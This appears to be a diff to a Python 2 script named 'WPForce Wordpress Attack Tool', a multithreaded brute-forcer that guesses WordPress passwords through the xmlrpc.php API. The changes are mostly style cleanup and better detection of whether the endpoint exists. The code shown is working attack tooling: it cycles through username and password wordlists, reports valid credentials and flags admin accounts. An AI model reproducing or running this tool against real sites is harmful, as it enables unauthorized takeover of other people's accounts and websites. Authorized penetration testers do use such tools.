@@ -58,7 +58,7 @@ def BuildThreads(list_array,url):
             print "\n-----------------------------------------------------"
     threads = []
     for i in range(len(list_array)):
-        t = threading.Thread(target=worker, args=(list_array[i],i,url))
+        t = threading.Thread(target=worker, args=(list_array[i], i, url))
         t.daemon = True
         threads.append(t)
         t.start()
@@ -82,18 +82,22 @@ def TestSite(url):
     try:
         urllib2.urlopen(url, timeout=3)
     except urllib2.HTTPError, e:
-        print url + " found!"
-        print "Now the brute force will begin!  >:)"
+        if e.code == 405:
+            print url + " found!"
+            print "Now the brute force will begin!  >:)"
+        if e.code == 404:
+            printout(str(e), YELLOW)
+            print " - XMLRPC has been moved, removed, or blocked"
+            sys.exit()
     except urllib2.URLError, g:
-        printout("Could not identify XMLRPC.  Please verify it's existance.\n", YELLOW)
+        printout("Could not identify XMLRPC.  Please verify the domain.\n", YELLOW)
         sys.exit()
     except socket.timeout as e:
-        print type(e)  # catched
-        raise MyException("The socket timed out, try it again.  (Site may down)")
+        print type(e)
+        print "The socket timed out, try it again.  (Site may down)"
 def PasswordAttempt(user,password,url,thread_no):
-    if (args.verbose == True or args.debug == True):
-        try_log = ""
-        if (args.debug == True):
+    if args.verbose is True or args.debug is True:
+        if args.debug is True:
             thready = "[Thread " + str(thread_no) + "]"
             printout(thready, YELLOW)
         print "Trying " + user + " : " + password
@@ -113,12 +117,11 @@ def PasswordAttempt(user,password,url,thread_no):
             print "--------------------------"
             success = "[" + user + " : " + password + "] are valid credentials!  "
             adminAlert = ""
-            if (splitter[23] == "1"):
+            if splitter[23] == "1":
                 adminAlert = "- THIS ACCOUNT IS ADMIN"
             printout(success, GREEN)
             printout(adminAlert, RED)
             print "\n--------------------------"
-            adminAlert = ""
         except:
             pass
     except urllib2.URLError, e:
@@ -131,14 +134,14 @@ def PasswordAttempt(user,password,url,thread_no):
         else:
             printout(str(e), YELLOW)
             print " - Try reducing Thread count "
-            if (args.verbose == True or args.debug == True):
+            if args.verbose is True or args.debug is True:
                 print user + ":" + password +" was skipped"
     except socket.timeout as e:
         printout(str(e), YELLOW)
         print " - Try reducing Thread count "
-        if (args.verbose == True or args.debug == True):
+        if args.verbose is True or args.debug is True:
             print user + ":" + password + " was skipped"
-#-----------------------------------------------------------------------------------------------------------------------------------------------
+
 parser = argparse.ArgumentParser(description='This is a tool to brute force Worpress using the Wordpress API')
 parser.add_argument('-i','--input', help='Input file name',required=True)
 parser.add_argument('-w','--wordlist',help='Wordlist file name', required=True)
@@ -148,7 +151,7 @@ parser.add_argument('-t','--threads',help=' Determines the number of threads to 
 parser.add_argument('-a','--agent',help=' Determines the user-agent', type=str, default="WPForce Wordpress Attack Tool 1.0", required=False)
 parser.add_argument('-d','--debug',help=' This option is used for determining issues with the script.', action='store_true', required=False)
 args = parser.parse_args()
-url = args.url +'/xmlrpc.php'
+url = args.url + '/xmlrpc.php'
 u = open(args.input, 'r')
 userlist = u.read().split('\n')
 totalusers = len(userlist)
@@ -160,11 +163,12 @@ TestSite(url)
 total = 0
 list_array = slice_list(passlist, args.threads)
 BuildThreads(list_array,url)
-while ((len(correct_pairs) <= totalusers) and  (len(passlist) > total)):
+while (len(correct_pairs) <= totalusers) and (len(passlist) > total):
         time.sleep(0.1)
         sys.stdout.flush()
-        percent =  "%.0f%%" % (100 * (total)/len(passlist))
-        print " " + percent + " Percent Complete\r" ,
+        percent = "%.0f%%" % (100 * (total)/len(passlist))
+        print " " + percent + " Percent Complete\r",
 print "\nAll correct pairs:"
 printout(str(correct_pairs), GREEN)
 print ""
+
